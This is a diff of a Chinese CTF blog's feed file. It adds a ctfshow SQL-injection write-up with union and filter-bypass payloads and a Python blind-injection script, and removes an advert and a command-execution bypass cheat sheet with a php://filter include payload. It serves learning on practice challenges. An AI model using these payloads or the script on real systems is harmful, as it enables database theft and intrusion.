@@ -4,6 +4,31 @@
   
   
   <entry>
+    <title>ctf-sql注入</title>
+    <link href="/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/"/>
+    <url>/2024/09/23/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow-sql%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<p>前言：sql算是最不熟悉的了，写的稍微详细一点吧,目前的ctf赛题是不会出一把梭的题目，实战环境sqlmap可以多用用，题目尽量还是手写。</p><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1<span class="hljs-string">&#x27; or 1=1--+</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">根据id = &#x27;&quot;.$<span class="hljs-emphasis">_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br><span class="hljs-emphasis">传入的内容拼接就相当于</span><br><span class="hljs-emphasis">id=&#x27;1&#x27; or 1=1--+&#x27;limit 1;</span><br></code></pre></td></tr></table></figure><p>进行了简单的sql绕过</p><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>本地加入了返回逻辑，详细可以自己查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,database()%23</span><br></code></pre></td></tr></table></figure><p>首先爆看看库名，发现了<code>ctfshow_web</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再对所有可能的表进行爆列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_user2<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>再进行爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user2%23</span><br></code></pre></td></tr></table></figure><p>最后直接定位到password进行了</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>先用上题的最后payload查看看看，发现not_here,看一下本题的返回逻辑</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>ctfshow_web<span class="hljs-string">&#x27;%23</span><br></code></pre></td></tr></table></figure><p>发现有个<code>ctfshow_user3</code>，直接写最后的payload，本题有匹配flag的过滤</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 union select 1,2,group_concat(password) from ctfshow_user3%23</span><br></code></pre></td></tr></table></figure><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>在前面的基础上过滤了<code>0-9</code></p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>利用replace就行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;B&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;C&#x27;</span>),<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;D&#x27;</span>),<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;E&#x27;</span>),<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;F&#x27;</span>),<span class="hljs-number">7</span>,<span class="hljs-string">&#x27;G&#x27;</span>),<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;H&#x27;</span>),<span class="hljs-number">9</span>,<span class="hljs-string">&#x27;I&#x27;</span>),<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;J&#x27;</span>);<br></code></pre></td></tr></table></figure><p>讲数字用字母进行替换</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#x27;</span>A<span class="hljs-string">&#x27;),2,&#x27;</span>B<span class="hljs-string">&#x27;),3,&#x27;</span>C<span class="hljs-string">&#x27;),4,&#x27;</span>D<span class="hljs-string">&#x27;),5,&#x27;</span>E<span class="hljs-string">&#x27;),6,&#x27;</span>F<span class="hljs-string">&#x27;),7,&#x27;</span>G<span class="hljs-string">&#x27;),8,&#x27;</span>H<span class="hljs-string">&#x27;),9,&#x27;</span>I<span class="hljs-string">&#x27;),0,&#x27;</span>J<span class="hljs-string">&#x27;),&#x27;</span>b<span class="hljs-string">&#x27; from ctfshow_user4 where username=&#x27;</span>flag<span class="hljs-string">&#x27; %23</span><br></code></pre></td></tr></table></figure><p>得到的flag需要进行替换</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>利用盲注得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 构造 Payload</span><br>payload = <span class="hljs-string">&quot;1&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span><br>url = <span class="hljs-string">&quot;http://17641de3-ec90-4f5e-a197-d6bcfc72684d.challenge.ctf.show//api/v4.php?id=&quot;</span><br><br><span class="hljs-comment"># 测试字符是否大于给定的 ASCII 值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_chr</span>(<span class="hljs-params">index: <span class="hljs-built_in">int</span>, offset: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url + payload.<span class="hljs-built_in">format</span>(index, offset), timeout=<span class="hljs-number">5</span>)<br>        <span class="hljs-comment"># 检查返回内容是否包含关键字</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;cluster&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;boom&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Unexpected response for index <span class="hljs-subst">&#123;index&#125;</span>, offset <span class="hljs-subst">&#123;offset&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Request failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># 开始盲注过程</span><br>index = <span class="hljs-number">1</span><br>flag = <span class="hljs-string">&quot;&quot;</span><br>max_length = <span class="hljs-number">50</span>  <span class="hljs-comment"># 假设flag最大长度</span><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(flag) &lt; max_length:<br>    start = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span>  <span class="hljs-comment"># ASCII 可打印字符范围</span><br>    <span class="hljs-keyword">while</span> start &lt; end:<br>        point = (start + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">if</span> test_chr(index, point):<br>            start = point + <span class="hljs-number">1</span>  <span class="hljs-comment"># 搜索更大的 ASCII 范围</span><br>        <span class="hljs-keyword">else</span>:<br>            end = point  <span class="hljs-comment"># 搜索更小的 ASCII 范围</span><br>    <span class="hljs-keyword">if</span> start == <span class="hljs-number">32</span>:  <span class="hljs-comment"># 当 start 等于 32 时，意味着没有更多字符</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Finished, flag is: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    flag += <span class="hljs-built_in">chr</span>(start)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] Current flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    index += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Final flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>需要先找到接口，输入，最后跑一下脚本</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>每日一题</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>sql注入</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>ctfshow文件上传</title>
     <link href="/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
     <url>/2024/09/20/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
@@ -391,19 +416,6 @@
   
   
   <entry>
-    <title>关注dk盾喵,谢谢喵</title>
-    <link href="/2024/06/26/dk/%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90/"/>
-    <url>/2024/06/26/dk/%E5%8F%8B%E6%83%85%E6%8E%A8%E8%8D%90/</url>
-    
-    <content type="html"><![CDATA[<p>在传统云服务器厂家还在为了薅光阿里云，腾讯云一众服务器而烦恼嘛</p><p>dk服务器值得拥有</p><p>扫码加群，了解详情，🎇</p><p>有符合各种需求的服务器，续费同价</p><p>🚀：DKdun-CTFers赞助计划火热进行</p><p>更多详情请加群了解(友链直达网站)</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/a.jpg" alt="a"></p>]]></content>
-    
-    
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>xxe漏洞学习</title>
     <link href="/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
     <url>/2024/06/10/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
@@ -449,9 +461,9 @@
       
       <tag>xxe</tag>
       
-      <tag>命令执行</tag>
-      
       <tag>伪协议</tag>
+      
+      <tag>命令执行</tag>
       
     </tags>
     
@@ -510,8 +522,6 @@
       <tag>ctf</tag>
       
       <tag>web</tag>
-      
-      <tag>学习</tag>
       
     </tags>
     
@@ -647,31 +657,6 @@
       <tag>ctf</tag>
       
       <tag>复盘</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>web之命令执行(持续更新)</title>
-    <link href="/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    <url>/2024/04/13/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
-    
-    <content type="html"><![CDATA[<h1 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h1><p>system<br>passthru<br>exec<br>show_source</p><h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><p>%09(tab)<br>$IFS$9<br>${IFS}<br>$IFS%09(tab)<br>&lt;(不能和通配符一起使用)<br>&lt;&gt;(不能和通配符一起使用)<br>%20(space)</p><h1 id="无字符绕过"><a href="#无字符绕过" class="headerlink" title="无字符绕过"></a>无字符绕过</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>第一种姿势利用poc文件上传，通过.&#x2F;tmp&#x2F;php??????这样的形式来写<br>通配符除了？和*之外还有[^x]可以使用，一般默认上传的最后一个字母是大写字母，可以用[ @-[ ]进行遍历<br>然后进行修改内容，可以先尝试whoami看看是否RCE成功，需要在#！&#x2F;bin&#x2F;sh下进行(我暂时还不太懂);然后ls看看，最后cat或者tac flag ,直接不行的情况下，可以在默认目录下(var&#x2F;www&#x2F;html&#x2F;XXX)<br>附上poc代码:</p><p><img src="/../../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/poc.png"></p><p>算是第一次接触到这种姿势，记录一下.</p><h2 id="构造数字"><a href="#构造数字" class="headerlink" title="$()构造数字"></a>$()构造数字</h2><p>在linux中,echo $(())默认为0，取反就是-1，也就是$((~ $(())))&#x3D;-1；<br>因为是默认相加构造负数最后整体相加即可。</p><h1 id="include包含"><a href="#include包含" class="headerlink" title="include包含"></a>include包含</h1><p>include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>include函数传入的参数不能执行系统命令，需要使用伪协议</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>命令执行</tag>
       
     </tags>
     
